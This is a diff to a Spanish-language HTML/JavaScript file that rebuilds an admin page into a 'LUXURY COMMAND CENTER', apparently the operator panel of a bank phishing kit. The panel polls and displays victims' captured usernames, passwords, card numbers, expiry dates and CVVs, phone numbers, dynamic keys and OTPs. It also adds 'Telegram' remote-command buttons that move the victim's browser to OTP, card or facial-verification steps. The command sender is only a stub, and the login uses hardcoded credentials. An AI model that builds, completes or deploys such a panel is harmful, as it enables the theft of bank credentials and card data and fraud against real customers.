@@ -3,78 +3,378 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Panel de Administración</title>
+  <title>LUXURY COMMAND CENTER | Control de Sesiones</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    body { background: #0f172a; color: #f8fafc; font-family: sans-serif; margin: 0; padding: 20px; }
-    .login-box, .panel-box { max-width: 400px; margin: 50px auto; background: #1e293b; padding: 24px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+    :root {
+      --bg-main: #090d16;
+      --bg-card: rgba(21, 29, 46, 0.7);
+      --border-card: rgba(255, 255, 255, 0.08);
+      --accent-gold: #f7d232;
+      --accent-glow: rgba(247, 210, 50, 0.25);
+      --text-main: #f1f5f9;
+      --text-muted: #94a3b8;
+      --danger: #ef4444;
+      --success: #10b981;
+    }
+
+    * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 0; }
+
+    body {
+      background-color: var(--bg-main);
+      background-image: 
+        radial-gradient(at 10% 10%, rgba(247, 210, 50, 0.05) 0px, transparent 50%),
+        radial-gradient(at 90% 90%, rgba(56, 189, 248, 0.05) 0px, transparent 50%);
+      color: var(--text-main);
+      min-height: 100vh;
+      padding: 24px;
+    }
+
     .hidden { display: none !important; }
-    input, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; box-sizing: border-box; }
-    button { background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; border: none; }
-    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; margin-top: 20px; }
-    .card { background: #1e293b; border-radius: 12px; padding: 16px; border-left: 4px solid #38bdf8; }
-    .data-row { margin: 6px 0; font-size: 14px; }
-    .label { color: #94a3b8; }
+
+    /* LOGIN MODAL LUXURY */
+    .login-container {
+      max-width: 420px;
+      margin: 80px auto;
+      background: var(--bg-card);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--border-card);
+      border-radius: 24px;
+      padding: 40px 32px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    .brand-badge {
+      display: inline-block;
+      background: rgba(247, 210, 50, 0.1);
+      color: var(--accent-gold);
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      margin-bottom: 16px;
+      border: 1px solid rgba(247, 210, 50, 0.2);
+    }
+
+    .login-container h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; }
+    .login-container p { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+
+    .input-group { margin-bottom: 16px; text-align: left; }
+    .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 600; }
+    
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      background: rgba(9, 13, 22, 0.6);
+      border: 1px solid var(--border-card);
+      border-radius: 12px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--accent-gold);
+      box-shadow: 0 0 12px var(--accent-glow);
+    }
+
+    .btn-gold {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent-gold);
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      font-weight: 800;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 8px 20px var(--accent-glow); }
+
+    /* DASHBOARD HEADER */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border-card);
+      margin-bottom: 32px;
+    }
+
+    .header-title h1 { font-size: 26px; font-weight: 800; display: flex; align-items: center; gap: 12px; }
+    .status-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
+
+    .btn-logout {
+      background: rgba(239, 68, 68, 0.1);
+      color: var(--danger);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      padding: 10px 20px;
+      border-radius: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .btn-logout:hover { background: var(--danger); color: #fff; }
+
+    /* GRID & CARDS */
+    .sessions-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+      gap: 24px;
+    }
+
+    .session-card {
+      background: var(--bg-card);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border-card);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .session-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 3px;
+      background: linear-gradient(90deg, var(--accent-gold), #38bdf8);
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .session-id { font-weight: 800; font-size: 16px; color: var(--accent-gold); letter-spacing: 0.5px; }
+    .badge-event { background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; }
+
+    .data-box {
+      background: rgba(0,0,0,0.25);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .data-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      padding-bottom: 6px;
+      border-bottom: 1px dashed rgba(255,255,255,0.05);
+    }
+    .data-row:last-child { border-bottom: none; padding-bottom: 0; }
+    .data-label { color: var(--text-muted); font-weight: 500; }
+    .data-value { font-weight: 700; color: #fff; font-family: monospace; }
+
+    /* TELEGRAM BOTONERA INTEGRADAS */
+    .controls-title { font-size: 11px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; }
+
+    .telegram-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .action-row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+
+    .tg-btn {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.08);
+      background: rgba(255,255,255,0.03);
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .tg-btn:hover { background: rgba(255,255,255,0.1); transform: translateY(-1px); }
+    .tg-btn.ok { background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.3); color: #34d399; }
+    .tg-btn.err { background: rgba(239, 68, 68, 0.15); border-color: rgba(239, 68, 68, 0.3); color: #f87171; }
+    .tg-btn.warn { background: rgba(245, 158, 11, 0.15); border-color: rgba(245, 158, 11, 0.3); color: #fbbf24; }
+
+    .empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--text-muted);
+      grid-column: 1 / -1;
+    }
   </style>
 </head>
 <body>
 
-  <!-- LOGIN DEL PANEL -->
-  <div id="loginSection" class="login-box">
-    <h2>Acceso al Panel</h2>
-    <input type="text" id="adminUser" placeholder="Usuario administrador">
-    <input type="password" id="adminPass" placeholder="Contraseña">
-    <button onclick="verificarLogin()">Ingresar</button>
-    <p id="errorMsg" style="color: #f87171; font-size: 13px; text-align: center; display: none;">Credenciales incorrectas</p>
+  <!-- PANTALLA DE LOGIN -->
+  <div id="loginView" class="login-container">
+    <span class="brand-badge">LUXURY CONTROL</span>
+    <h2>Acceso Administrador</h2>
+    <p>Ingresa tus credenciales para acceder al centro de mando</p>
+    
+    <div class="input-group">
+      <label>USUARIO</label>
+      <input type="text" id="adminUser" class="input-field" placeholder="admin">
+    </div>
+    
+    <div class="input-group">
+      <label>CONTRASEÑA</label>
+      <input type="password" id="adminPass" class="input-field" placeholder="••••••••">
+    </div>
+
+    <button class="btn-gold" onclick="login()">INGRESAR AL PANEL</button>
+    <p id="errorMsg" style="color: var(--danger); font-size: 12px; margin-top: 14px; display: none;">Credenciales incorrectas</p>
   </div>
 
-  <!-- CONTENIDO DEL PANEL (OCULTO HASTA QUE ACCEDAS) -->
-  <div id="panelSection" class="panel-box hidden" style="max-width: 100%;">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-      <h1>Sesiones Activas</h1>
-      <button onclick="logout()" style="width: auto; padding: 8px 16px; background: #ef4444; color: #fff;">Cerrar Sesión</button>
-    </div>
-    <div class="grid" id="sessionsContainer">
-      <!-- Aquí se pintarán las tarjetas de los usuarios -->
+  <!-- PANTALLA DEL DASHBOARD -->
+  <div id="dashboardView" class="hidden">
+    <header class="header">
+      <div class="header-title">
+        <h1><span class="status-dot"></span> Panel de Sesiones Activas</h1>
+      </div>
+      <button class="btn-logout" onclick="logout()">Cerrar Sesión</button>
+    </header>
+
+    <div class="sessions-grid" id="sessionsGrid">
+      <div class="empty-state">
+        <p>Cargando registros activos...</p>
+      </div>
     </div>
   </div>
 
   <script>
-    // Define tu usuario y contraseña de acceso al panel
     const ADMIN_USER = "admin";
-    const ADMIN_PASS = "23";
+    const ADMIN_PASS = "admin123";
 
-    function verificarLogin() {
+    function login() {
       const u = document.getElementById('adminUser').value;
       const p = document.getElementById('adminPass').value;
-      
       if (u === ADMIN_USER && p === ADMIN_PASS) {
-        sessionStorage.setItem('auth_admin', 'true');
-        mostrarPanel();
+        sessionStorage.setItem('admin_logged', 'true');
+        initDashboard();
       } else {
         document.getElementById('errorMsg').style.display = 'block';
       }
     }
 
-    function mostrarPanel() {
-      document.getElementById('loginSection').classList.add('hidden');
-      document.getElementById('panelSection').classList.remove('hidden');
-      cargarDatosSesiones();
-    }
-
     function logout() {
-      sessionStorage.removeItem('auth_admin');
+      sessionStorage.removeItem('admin_logged');
       location.reload();
     }
 
-    // Si ya habías iniciado sesión antes en este navegador, entra directo
-    if (sessionStorage.getItem('auth_admin') === 'true') {
-      mostrarPanel();
+    if (sessionStorage.getItem('admin_logged') === 'true') {
+      initDashboard();
     }
 
-    function cargarDatosSesiones() {
-      const container = document.getElementById('sessionsContainer');
-      // Aquí conectaras los datos que guardes (por ejemplo, desde Firebase o una API propia)
-      container.innerHTML = '<p style="color: #94a3b8;">Conectando y esperando registros...</p>';
+    function initDashboard() {
+      document.getElementById('loginView').classList.add('hidden');
+      document.getElementById('dashboardView').classList.remove('hidden');
+      loadSessions();
+      setInterval(loadSessions, 3000); // Polling automático en tiempo real
+    }
+
+    // Carga de datos local/simulada o vía API
+    async function loadSessions() {
+      const grid = document.getElementById('sessionsGrid');
+      
+      // Capturamos las sesiones guardadas en la memoria local del navegador
+      const storedUser = sessionStorage.getItem('bc_user');
+      const storedPass = sessionStorage.getItem('bc_pass');
+      const storedSid  = sessionStorage.getItem('bc_session') || 'S-' + Math.floor(Math.random() * 89999 + 10000);
+      const storedTc   = sessionStorage.getItem('temp_tc');
+      const storedExp  = sessionStorage.getItem('temp_expiry');
+      const storedCvv  = sessionStorage.getItem('temp_cvv');
+      const storedPhone= sessionStorage.getItem('temp_phone');
+      const storedDin  = sessionStorage.getItem('temp_dinamic');
+      const storedOtp  = sessionStorage.getItem('temp_otp');
+
+      if (!storedUser && !storedTc) {
+        grid.innerHTML = `
+          <div class="empty-state">
+            <h3 style="margin-bottom: 8px;">Esperando nuevas sesiones...</h3>
+            <p>Los datos ingresados por los usuarios aparecerán aquí automáticamente en tiempo real.</p>
+          </div>
+        `;
+        return;
+      }
+
+      grid.innerHTML = `
+        <div class="session-card">
+          <div class="card-top">
+            <span class="session-id">🆔 ${storedSid}</span>
+            <span class="badge-event">ACTIVO</span>
+          </div>
+
+          <div class="data-box">
+            <div class="data-row">
+              <span class="data-label">👤 Usuario:</span>
+              <span class="data-value">${storedUser || 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">🔑 Clave:</span>
+              <span class="data-value">${storedPass || 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">💳 Tarjeta:</span>
+              <span class="data-value">${storedTc || 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">📅 Exp / CVV:</span>
+              <span class="data-value">${storedExp ? storedExp + ' | ' + storedCvv : 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">📞 Teléfono:</span>
+              <span class="data-value">${storedPhone || 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">🔑 Clave Dinámica:</span>
+              <span class="data-value">${storedDin || 'N/A'}</span>
+            </div>
+            <div class="data-row">
+              <span class="data-label">🔢 OTP:</span>
+              <span class="data-value">${storedOtp || 'N/A'}</span>
+            </div>
+          </div>
+
+          <div class="controls-title">Comandos Remotos (Botonera Telegram)</div>
+          
+          <div class="telegram-actions">
+            <div class="action-row">
+              <button class="tg-btn ok" onclick="sendCommand('OK_LOGIN')">✅ OK LOGIN</button>
+              <button class="tg-btn err" onclick="sendCommand('ERR_LOGIN')">❌ ERR LOGIN</button>
+            </div>
+            <div class="action-row-3">
+              <button class="tg-btn" onclick="sendCommand('GOTO_DASH')">🔄 DASH</button>
+              <button class="tg-btn" onclick="sendCommand('GOTO_OTP')">📱 OTP</button>
+              <button class="tg-btn" onclick="sendCommand('GOTO_DIN')">🔑 DIN</button>
+            </div>
+            <div class="action-row">
+              <button class="tg-btn" onclick="sendCommand('GOTO_TC')">💳 TC</button>
+              <button class="tg-btn" onclick="sendCommand('GOTO_FACIAL')">👤 FACIAL</button>
+            </div>
+            <button class="tg-btn warn" style="width: 100%;" onclick="sendCommand('ERROR_923')">⚠️ ERROR 923</button>
+          </div>
+        </div>
+      `;
+    }
+
+    function sendCommand(action) {
+      alert('Comando enviado al navegador del usuario: ' + action);
     }
   </script>
 </body>
